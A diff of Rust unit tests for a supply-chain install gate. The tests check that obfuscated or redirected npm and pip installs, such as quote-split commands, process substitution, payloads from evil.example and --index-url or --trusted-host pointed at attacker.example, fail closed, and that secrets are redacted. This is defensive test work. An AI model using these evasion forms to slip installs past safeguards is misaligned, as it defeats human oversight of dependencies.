     #[test]
@@ -4563,7 +5606,10 @@ mod tests {
         let v = detect_installs(r#"echo data | tee /tmp/out # 'pip install x' in body"#);
         // `tee` is the head of the post-pipe segment; both `echo` and `tee`
         // are data utilities, so neither segment must trigger detection.
-        assert!(v.is_empty(), "tee writes stdin to file+stdout, no exec: {v:?}");
+        assert!(
+            v.is_empty(),
+            "tee writes stdin to file+stdout, no exec: {v:?}"
+        );
     }
 
     #[test]
@@ -4718,95 +5764,40 @@ mod tests {
     }
 
     #[test]
-    fn inline_bypass_simple() {
-        // The exact form the gate's own error message tells users to run.
-        assert!(cmd_has_leading_assignment(
-            "CONTEXTCRAWLER_SUPPLY_CHAIN=off pip install starlette==0.49.1",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
+    fn issue_227_command_text_cannot_disable_enabled_gate() {
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        let verdict = check_with_config("CONTEXTCRAWLER_SUPPLY_CHAIN=off npm install", &config);
+        assert!(
+            matches!(verdict, Verdict::Ask(_)),
+            "the command text is attacker-controlled and must not disable the gate"
+        );
+    }
+
+    #[test]
+    fn issue_227_default_off_remains_a_noop() {
+        assert!(matches!(
+            check_with_config("npm install", &Config::default()),
+            Verdict::Skip
         ));
     }
 
     #[test]
-    fn inline_bypass_value_variants() {
-        for v in &["off", "0", "false", "no"] {
-            let cmd = format!("CONTEXTCRAWLER_SUPPLY_CHAIN={} pip install x", v);
-            assert!(
-                cmd_has_leading_assignment(
-                    &cmd,
-                    "CONTEXTCRAWLER_SUPPLY_CHAIN",
-                    &["off", "0", "false", "no"],
-                ),
-                "should recognise value {}",
-                v
-            );
-        }
-    }
-
-    #[test]
-    fn inline_bypass_with_sibling_assignments() {
-        // Real-world: `FOO=bar CONTEXTCRAWLER_SUPPLY_CHAIN=off cmd`.
-        assert!(cmd_has_leading_assignment(
-            "FOO=bar CONTEXTCRAWLER_SUPPLY_CHAIN=off pip install x",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
-        ));
-        // Whitespace tolerance.
-        assert!(cmd_has_leading_assignment(
-            "  FOO=bar   CONTEXTCRAWLER_SUPPLY_CHAIN=off   pip install x",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
+    fn issue_227_enabled_gate_still_allows_configured_benign_package() {
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        config.overrides.always_allow.push("left-pad".to_string());
+        assert!(matches!(
+            check_with_config("npm install left-pad", &config),
+            Verdict::Allow
         ));
     }
 
     #[test]
-    fn inline_bypass_mid_cmd_does_not_count() {
-        // Bypass must be PREFIX, not mid-cmd. `&&` is not a sibling
-        // assignment, so once we hit `pip` the leading run ends.
-        assert!(!cmd_has_leading_assignment(
-            "pip install x && CONTEXTCRAWLER_SUPPLY_CHAIN=off other",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
-        ));
-    }
-
-    #[test]
-    fn inline_bypass_wrong_value_does_not_count() {
-        // Defensive: user typed `=on` thinking it enables — must NOT bypass.
-        assert!(!cmd_has_leading_assignment(
-            "CONTEXTCRAWLER_SUPPLY_CHAIN=on pip install x",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off", "0", "false", "no"],
-        ));
-    }
-
-    #[test]
-    fn inline_bypass_value_must_match_exactly() {
-        // `=offsuffix` is not `=off`.
-        assert!(!cmd_has_leading_assignment(
-            "CONTEXTCRAWLER_SUPPLY_CHAIN=offsuffix pip install x",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
-        ));
-    }
-
-    #[test]
-    fn inline_bypass_invalid_identifier_breaks_run() {
-        // `1NAME=` is not a valid identifier — should stop the leading run.
-        assert!(!cmd_has_leading_assignment(
-            "1NAME=x CONTEXTCRAWLER_SUPPLY_CHAIN=off pip install x",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
-        ));
-    }
-
-    #[test]
-    fn inline_bypass_empty_cmd() {
-        assert!(!cmd_has_leading_assignment(
-            "",
-            "CONTEXTCRAWLER_SUPPLY_CHAIN",
-            &["off"],
-        ));
+    fn issue_227_render_does_not_suggest_command_text_bypass() {
+        let output = render(&Verdict::Ask(Vec::new()));
+        assert!(!output.contains("CONTEXTCRAWLER_SUPPLY_CHAIN=off"));
+        assert!(output.contains("confirm explicitly"));
     }
 
     #[test]
@@ -4822,16 +5813,675 @@ mod tests {
 
     #[test]
     fn http_err_4xx_is_not_retryable() {
-        // 404 = package doesn't exist; 401/403 = auth; 429 = rate-limit
-        // (we don't retry that here — would just add load against the same
-        // limiter; a separate cooldown could be future work).
-        for code in [400u16, 401, 403, 404, 422, 429] {
+        // Terminal request failures remain terminal. Rate limiting is tested
+        // separately because it is transient and must be retried (#231).
+        for code in [400u16, 401, 403, 404, 422] {
             assert!(
                 !is_retryable_http_err_tag(HttpErrTag::Status(code)),
                 "4xx must NOT be retryable: {}",
                 code
             );
         }
+    }
+
+    #[test]
+    fn http_err_429_is_retryable_231() {
+        assert!(
+            is_retryable_http_err_tag(HttpErrTag::Status(429)),
+            "rate limiting is transient and must retain the bounded retry/backoff path"
+        );
+    }
+
+    #[test]
+    fn issue_227_reconstructs_concatenated_quoted_words() {
+        let installs = detect_installs("n'p'm in'st'all evil");
+        assert_eq!(
+            installs.len(),
+            1,
+            "quoted fragments must not hide an install"
+        );
+        assert_eq!(names(&installs[0]), vec!["evil"]);
+    }
+
+    #[test]
+    fn issue_227_parses_manager_global_options_before_install() {
+        let npm = detect_installs("npm --prefix /tmp install evil");
+        assert_eq!(npm.len(), 1, "npm --prefix must not hide install");
+        assert!(npm[0].packages.is_empty());
+        assert!(npm[0].unvettable.is_some());
+
+        let pip = detect_installs("pip --isolated install evil");
+        assert_eq!(pip.len(), 1, "pip --isolated must not hide install");
+        assert_eq!(names(&pip[0]), vec!["evil"]);
+    }
+
+    #[test]
+    fn issue_227_recurses_into_process_substitution() {
+        let installs = detect_installs("cat <(npm install evil)");
+        assert_eq!(
+            installs.len(),
+            1,
+            "executed process substitutions must be vetted"
+        );
+        assert_eq!(names(&installs[0]), vec!["evil"]);
+    }
+
+    #[test]
+    fn issue_227_newline_after_verb_is_a_command_boundary() {
+        let installs = detect_installs("npm install\nis-number@7.0.0");
+        assert_eq!(
+            installs.len(),
+            1,
+            "the first line still runs a lockfile install"
+        );
+        assert!(installs[0].packages.is_empty());
+        assert!(installs[0].unvettable.is_some());
+    }
+
+    #[test]
+    fn issue_228_remote_pypi_source_is_unvettable_even_when_local_editables_are_allowed() {
+        let installs = detect_installs("pip install https://evil.example/payload.whl");
+        assert_eq!(installs.len(), 1);
+        assert!(
+            installs[0].unvettable.is_some(),
+            "remote content has no trustworthy registry identity and must fail closed"
+        );
+
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        assert!(matches!(
+            check_with_config("pip install https://evil.example/payload.whl", &config),
+            Verdict::Ask(_)
+        ));
+        assert!(matches!(
+            check_with_config("pip install -e .", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn issue_228_requirement_finding_redacts_url_credentials() {
+        let installs =
+            detect_installs("pip install --requirement=https://user:secret@example.test/req.txt");
+        assert_eq!(installs.len(), 1);
+        let detail = installs[0]
+            .unvettable
+            .as_deref()
+            .expect("requirements indirection must be unvettable");
+        assert!(!detail.contains("user"));
+        assert!(!detail.contains("secret"));
+        assert!(detail.contains("--requirement"));
+        assert!(detail.contains("example.test"));
+        assert!(detail.contains("req.txt"));
+        assert_eq!(
+            sanitise_source_target("https://user:secret@"),
+            "<remote>",
+            "malformed remote targets must not fall back to raw user-info"
+        );
+    }
+
+    #[test]
+    fn issue_228_installer_basename_is_utf8_boundary_safe() {
+        assert_eq!(installer_basename("éabc"), "éabc");
+        assert_eq!(installer_basename("é.cmd"), "é");
+    }
+
+    #[test]
+    fn issue_228_osv_error_is_not_silently_discarded() {
+        let mut findings = Vec::new();
+        let result = collect_osv_findings(
+            Err("HTTP 429 / malformed response".to_string()),
+            "known-vulnerable",
+            Ecosystem::Npm,
+            Severity::High,
+            &mut findings,
+        );
+        let error = result.expect_err("OSV failure must block an Allow decision");
+        assert!(error.contains("OSV lookup failed"));
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn issue_228_mutable_cache_is_revalidated_before_use() {
+        let forged = (
+            "9.9.9".to_string(),
+            parse_iso8601("2001-01-01T00:00:00Z").expect("fixture timestamp"),
+        );
+        let authoritative = ("9.9.9".to_string(), Utc::now());
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(Some(forged), 3, || {
+            fetched.set(true);
+            Ok(authoritative.clone())
+        })
+        .expect("authoritative metadata");
+
+        assert!(
+            fetched.get(),
+            "a fresh cache hint must not skip revalidation"
+        );
+        assert_eq!(selected, authoritative);
+        assert!(refresh);
+    }
+
+    #[test]
+    fn round_2_cache_hit_is_used_only_when_it_cannot_justify_allow() {
+        let recent = ("1.2.3".to_string(), Utc::now() - ChronoDuration::hours(1));
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(Some(recent.clone()), 3, || {
+            fetched.set(true);
+            Err("recent cache should short-circuit to the cooldown block".to_string())
+        })
+        .expect("recent cached metadata");
+        assert!(!fetched.get());
+        assert_eq!(selected, recent);
+        assert!(!refresh);
+
+        let allow_capable = ("1.2.3".to_string(), Utc::now() - ChronoDuration::days(30));
+        let authoritative = ("1.2.4".to_string(), Utc::now());
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(Some(allow_capable), 3, || {
+            fetched.set(true);
+            Ok(authoritative.clone())
+        })
+        .expect("allow-capable cache must be revalidated");
+        assert!(fetched.get());
+        assert_eq!(selected, authoritative);
+        assert!(refresh);
+    }
+
+    #[test]
+    fn round_2_missing_or_stale_cache_hint_fetches_authoritative_metadata() {
+        let authoritative = ("2.0.0".to_string(), Utc::now());
+        let fetched = std::cell::Cell::new(false);
+        let (selected, refresh) = revalidate_cached_metadata(None, 3, || {
+            fetched.set(true);
+            Ok(authoritative.clone())
+        })
+        .expect("missing cache must fetch");
+        assert!(fetched.get());
+        assert_eq!(selected, authoritative);
+        assert!(refresh);
+    }
+
+    #[test]
+    fn round_2_cache_ttl_rejects_stale_disk_entry() {
+        let dir = tempfile::TempDir::new().expect("tempdir");
+        let path = dir.path().join("pypi-stale.json");
+        let stale = CacheEntry {
+            version: "1.0.0".to_string(),
+            publish_time: (Utc::now() - ChronoDuration::days(30)).to_rfc3339(),
+            fetched_at: (Utc::now() - ChronoDuration::hours(25)).to_rfc3339(),
+        };
+        cache_put_at(&path, &stale).expect("stale cache fixture");
+        assert!(cache_get_at(&path).is_none(), "stale cache must be ignored");
+    }
+
+    #[test]
+    fn round_2_repeated_short_verbosity_flags_are_exact() {
+        assert!(manager_option_is_boolean("pip", "-vvv"));
+        assert!(manager_option_is_boolean("pip", "-qq"));
+        assert!(manager_option_is_boolean("uv", "-vv"));
+        assert!(!manager_option_is_boolean("pip", "-version"));
+        assert!(!manager_option_is_boolean("pip", "-qxz"));
+    }
+
+    #[test]
+    fn round_2_attached_value_option_is_not_a_package() {
+        let command = "npm install --cache=/tmp/npm-cache left-pad";
+        let installs = detect_installs(command);
+        assert_eq!(installs.len(), 1);
+        assert_eq!(names(&installs[0]), vec!["left-pad"]);
+        assert!(installs[0].unvettable.is_none());
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config(command, &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn issue_231_cache_replacement_is_private() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = tempfile::TempDir::new().expect("tempdir");
+        let entry = CacheEntry {
+            version: "1.0.0".to_string(),
+            publish_time: "2026-01-01T00:00:00Z".to_string(),
+            fetched_at: "2026-01-02T00:00:00Z".to_string(),
+        };
+
+        // npm_metadata and pypi_metadata both route through cache_put ->
+        // cache_put_at -> write_private_atomic. Exercise both cache filename
+        // shapes so #231 cannot regress on only one ecosystem.
+        for cache_name in ["npm-example.json", "pypi-example.json"] {
+            let path = dir.path().join(cache_name);
+            fs::write(&path, b"attacker controlled").expect("seed cache");
+            fs::set_permissions(&path, fs::Permissions::from_mode(0o644))
+                .expect("seed permissive mode");
+
+            cache_put_at(&path, &entry).expect("private cache write");
+            let mode = fs::metadata(&path)
+                .expect("cache metadata")
+                .permissions()
+                .mode()
+                & 0o777;
+            assert_eq!(mode, 0o600, "private replacement mode for {cache_name}");
+        }
+    }
+
+    fn round_2_allowlisted_config(packages: &[&str]) -> Config {
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        config
+            .overrides
+            .always_allow
+            .extend(packages.iter().map(|package| (*package).to_string()));
+        config
+    }
+
+    #[test]
+    fn round_2_manager_name_line_continuations_are_joined_before_tokenising() {
+        for command in ["npm\\\n install evil", "npm\\\r\n install evil"] {
+            let installs = detect_installs(command);
+            assert_eq!(
+                installs.len(),
+                1,
+                "continued manager must be detected: {command:?}"
+            );
+            assert_eq!(names(&installs[0]), vec!["evil"]);
+        }
+    }
+
+    #[test]
+    fn round_2_line_continuation_does_not_swallow_a_later_command_boundary() {
+        let installs = detect_installs("npm\\\n\ninstall evil");
+        assert!(
+            installs.is_empty(),
+            "only the escaped newline is joined; the following bare newline remains a boundary: {installs:?}"
+        );
+    }
+
+    #[test]
+    fn round_2_registry_and_config_switches_fail_closed() {
+        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
+        for command in [
+            "npm install --registry=https://evil.example left-pad",
+            "npm install --userconfig /tmp/evil.npmrc left-pad",
+            "npm install --globalconfig=/tmp/evil.npmrc left-pad",
+            "npm -C /tmp/project install left-pad",
+            "pip install --index-url=https://evil.example/simple requests",
+            "uv --index-url https://evil.example/simple pip install requests",
+        ] {
+            let installs = detect_installs(command);
+            assert!(
+                installs.iter().any(|install| install.unvettable.is_some()),
+                "registry/config selection must be unvettable: {command:?} -> {installs:?}"
+            );
+            assert!(
+                matches!(check_with_config(command, &config), Verdict::Ask(_)),
+                "an allowlisted name must not bypass registry/config uncertainty: {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn round_2_explicit_default_npm_registry_remains_allowable() {
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config(
+                "npm install --registry=https://registry.npmjs.org left-pad",
+                &config
+            ),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_2_quoted_remote_url_is_unvettable() {
+        let installs = detect_installs(r#"pip install "https://evil.example/payload.whl""#);
+        assert_eq!(installs.len(), 1);
+        assert!(installs[0].unvettable.is_some());
+        assert!(installs[0].packages.is_empty());
+    }
+
+    #[test]
+    fn round_2_scp_and_git_transport_sources_are_unvettable_and_redacted() {
+        let scp = detect_installs(
+            r#"pip install "git@github.com:owner/repo.git?token=round2-supersecret""#,
+        );
+        assert_eq!(scp.len(), 1);
+        let rendered = format!("{scp:?}");
+        assert!(scp[0].unvettable.is_some());
+        assert!(scp[0].packages.is_empty());
+        assert!(
+            !rendered.contains("round2-supersecret"),
+            "secret leaked: {rendered}"
+        );
+        assert!(!rendered.contains("git@"), "userinfo leaked: {rendered}");
+
+        for source in [
+            "git+http://evil.example/repo.git",
+            "git+https://evil.example/repo.git",
+            "git+ssh://git@evil.example/repo.git",
+        ] {
+            let installs = detect_installs(&format!("pip install {source}"));
+            assert_eq!(installs.len(), 1, "missing transport: {source}");
+            assert!(installs[0].unvettable.is_some(), "source escaped: {source}");
+        }
+    }
+
+    #[test]
+    fn round_2_tokenisation_failure_is_unvettable() {
+        let installs = detect_installs("npm install left-pad # unclosed 'quote");
+        assert!(
+            installs.iter().any(|install| {
+                install
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("token"))
+            }),
+            "unparseable install command must fail closed: {installs:?}"
+        );
+    }
+
+    #[test]
+    fn round_2_common_boolean_flags_preserve_benign_allow() {
+        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
+        for command in [
+            "npm --save install left-pad",
+            "npm --save-dev install left-pad",
+            "npm --production install left-pad",
+            "pip --user install requests",
+            "pip -U install requests",
+            "pip --upgrade install requests",
+            "pip --pre install requests",
+            "pip --no-deps install requests",
+            "pip --verbose install requests",
+            "pip --quiet install requests",
+            "pip -vv install requests",
+            "pip -qq install requests",
+            "uv --verbose pip install requests",
+            "uv --quiet pip install requests",
+        ] {
+            assert!(
+                matches!(check_with_config(command, &config), Verdict::Allow),
+                "benign boolean option over-blocked: {command:?} -> {:?}",
+                detect_installs(command)
+            );
+        }
+    }
+
+    #[test]
+    fn round_2_scanner_continues_after_flag_shaped_option_value() {
+        let command = "npm --cache --install install left-pad";
+        let installs = detect_installs(command);
+        assert_eq!(installs.len(), 1, "real verb after option value was missed");
+        assert_eq!(names(&installs[0]), vec!["left-pad"]);
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config(command, &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_2_missing_editable_target_fails_closed() {
+        let installs = detect_installs("pip install -e");
+        assert_eq!(installs.len(), 1);
+        assert!(!installs[0].has_editable);
+        assert!(installs[0].unvettable.is_some());
+
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        assert!(matches!(
+            check_with_config("pip install -e", &config),
+            Verdict::Ask(_)
+        ));
+    }
+
+    #[test]
+    fn round_2_y2k_boundary_is_accepted() {
+        assert!(parse_iso8601("2000-01-01T00:00:00Z").is_ok());
+        assert!(parse_iso8601("1999-12-31T23:59:59Z").is_err());
+    }
+
+    #[test]
+    fn round_2_conda_channel_uses_the_conda_caveat() {
+        let installs = detect_installs("conda install -c conda-forge numpy");
+        assert_eq!(installs.len(), 1);
+        let detail = installs[0]
+            .unvettable
+            .as_deref()
+            .expect("conda installs are unvettable against PyPI");
+        assert!(detail.contains("conda channels"));
+        assert!(!detail.contains("requirements/constraints"));
+    }
+
+    #[test]
+    fn round_2_process_substitution_errors_fail_closed() {
+        let malformed = detect_installs("cat <(npm install evil");
+        assert!(malformed.iter().any(|install| install.unvettable.is_some()));
+
+        let over_limit = format!("cat <({})", "x".repeat(65 * 1024));
+        let installs = detect_installs(&over_limit);
+        assert!(installs.iter().any(|install| install.unvettable.is_some()));
+    }
+
+    #[test]
+    fn round_3_pip_and_uv_network_trust_options_fail_closed_and_redact_values() {
+        let config = round_2_allowlisted_config(&["requests"]);
+        for command in [
+            "pip install requests --trusted-host attacker.example",
+            "pip install requests --cert /tmp/round3-cert.pem",
+            "pip install requests --client-cert /tmp/round3-client.pem",
+            "pip install requests --proxy http://user:round3-secret@attacker.example",
+            "pip install requests --index-url=https://pypi.org/simple",
+            "pip install requests --extra-index-url https://attacker.example/simple",
+            "pip install requests --find-links https://attacker.example/wheels",
+            "pip --trusted-host attacker.example install requests",
+            "uv pip install requests --trusted-host attacker.example",
+            "uv pip install requests --cert /tmp/round3-cert.pem",
+            "uv pip install requests --client-cert /tmp/round3-client.pem",
+            "uv pip install requests --proxy http://user:round3-secret@attacker.example",
+            "uv pip install requests --index-url=https://pypi.org/simple",
+            "uv pip install requests --extra-index-url https://attacker.example/simple",
+            "uv pip install requests --find-links https://attacker.example/wheels",
+            "uv --trusted-host attacker.example install requests",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1, "missing network-trust option: {command}");
+            assert!(
+                installs[0].unvettable.is_some(),
+                "network-trust option must fail closed: {command} -> {installs:?}"
+            );
+            assert!(
+                installs[0].packages.is_empty(),
+                "unvettable source must be one unit: {command} -> {installs:?}"
+            );
+            let rendered = format!("{installs:?}");
+            assert!(
+                !rendered.contains("attacker.example"),
+                "host leaked: {rendered}"
+            );
+            assert!(
+                !rendered.contains("round3-"),
+                "option value leaked: {rendered}"
+            );
+            assert!(
+                matches!(check_with_config(command, &config), Verdict::Ask(_)),
+                "allowlisted package must not bypass source uncertainty: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn round_3_recursion_tokenisation_failure_has_a_dedicated_fail_closed_finding() {
+        let installs = detect_installs("bash -lc 'npm install evil");
+        assert!(
+            installs.iter().any(|install| {
+                install
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("recursion segment tokenisation failed"))
+            }),
+            "recursion extraction errors must not be silently dropped: {installs:?}"
+        );
+    }
+
+    #[test]
+    fn round_3_balanced_shell_wrapper_preserves_benign_allow() {
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        assert!(matches!(
+            check_with_config("bash -lc 'npm install left-pad'", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_3_package_launchers_fail_closed_without_overblocking_diagnostics() {
+        let mut config = Config::default();
+        config.supply_chain.enabled = true;
+        for command in [
+            "npx create-react-app foo",
+            "pnpx create-react-app foo",
+            "yarn dlx create-react-app foo",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1, "launcher escaped detection: {command}");
+            assert!(installs[0].packages.is_empty());
+            assert!(
+                installs[0]
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("pulls arbitrary packages")),
+                "launcher needs the local-only caveat: {command} -> {installs:?}"
+            );
+            assert!(matches!(
+                check_with_config(command, &config),
+                Verdict::Ask(_)
+            ));
+        }
+
+        for command in [
+            "npx --version",
+            "pnpx --help",
+            "yarn --version",
+            "yarn dlx",
+            "yarn dlx --help",
+        ] {
+            assert!(
+                detect_installs(command).is_empty(),
+                "diagnostic launcher command over-blocked: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn round_3_pnpm_frozen_and_bare_lockfile_installs_fail_closed() {
+        let config = round_2_allowlisted_config(&["left-pad"]);
+        for command in [
+            "pnpm install left-pad --frozen-lockfile",
+            "pnpm --frozen-lockfile install left-pad",
+            "pnpm install --frozen-lockfile",
+            "pnpm install",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1, "pnpm install escaped: {command}");
+            assert!(
+                installs[0].packages.is_empty(),
+                "hybrid finding: {installs:?}"
+            );
+            assert!(
+                installs[0].unvettable.is_some(),
+                "must fail closed: {command}"
+            );
+            assert!(
+                installs[0]
+                    .unvettable
+                    .as_deref()
+                    .is_some_and(|detail| detail.contains("pnpm-lock.yaml")),
+                "pnpm lockfile install needs the local-only caveat: {installs:?}"
+            );
+            assert!(matches!(
+                check_with_config(command, &config),
+                Verdict::Ask(_)
+            ));
+        }
+
+        assert!(matches!(
+            check_with_config("pnpm install left-pad", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_3_non_git_scp_sources_are_unvettable_and_redacted() {
+        let command = r#"pip install "alice@github.com:owner/repo.git?token=round3-supersecret""#;
+        let installs = detect_installs(command);
+        assert_eq!(installs.len(), 1);
+        assert!(installs[0].unvettable.is_some());
+        assert!(installs[0].packages.is_empty());
+        let rendered = format!("{installs:?}");
+        assert!(
+            !rendered.contains("round3-supersecret"),
+            "secret leaked: {rendered}"
+        );
+        assert!(!rendered.contains("alice@"), "userinfo leaked: {rendered}");
+
+        let config = round_2_allowlisted_config(&["@scope/pkg"]);
+        assert!(matches!(
+            check_with_config("npm install @scope/pkg", &config),
+            Verdict::Allow
+        ));
+    }
+
+    #[test]
+    fn round_3_no_index_source_caveat_clears_named_packages() {
+        for command in [
+            "pip install --no-index requests",
+            "pip install requests --no-index",
+            "uv pip install --no-index requests",
+        ] {
+            let installs = detect_installs(command);
+            assert_eq!(installs.len(), 1);
+            assert!(installs[0].unvettable.is_some());
+            assert!(
+                installs[0].packages.is_empty(),
+                "source caveat must not produce a hybrid finding: {command} -> {installs:?}"
+            );
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn issue_228_audit_log_is_private_and_does_not_follow_symlinks() {
+        use std::os::unix::fs::{symlink, PermissionsExt};
+
+        let dir = tempfile::TempDir::new().expect("tempdir");
+        let path = dir.path().join("supply_chain.jsonl");
+        fs::write(&path, b"old\n").expect("seed log");
+        fs::set_permissions(&path, fs::Permissions::from_mode(0o644))
+            .expect("seed permissive mode");
+        append_private_audit_record(&path, "new").expect("append audit record");
+        let mode = fs::metadata(&path)
+            .expect("audit metadata")
+            .permissions()
+            .mode()
+            & 0o777;
+        assert_eq!(mode, 0o600);
+
+        let victim = dir.path().join("victim");
+        fs::write(&victim, b"do not touch").expect("victim");
+        let link = dir.path().join("linked.jsonl");
+        symlink(&victim, &link).expect("symlink");
+        assert!(append_private_audit_record(&link, "attack").is_err());
+        assert_eq!(fs::read(&victim).expect("victim bytes"), b"do not touch");
+
+        let hardlink = dir.path().join("hardlinked.jsonl");
+        fs::hard_link(&victim, &hardlink).expect("hard link");
+        assert!(append_private_audit_record(&hardlink, "attack").is_err());
+        assert_eq!(fs::read(&victim).expect("victim bytes"), b"do not touch");
     }
 
     #[test]
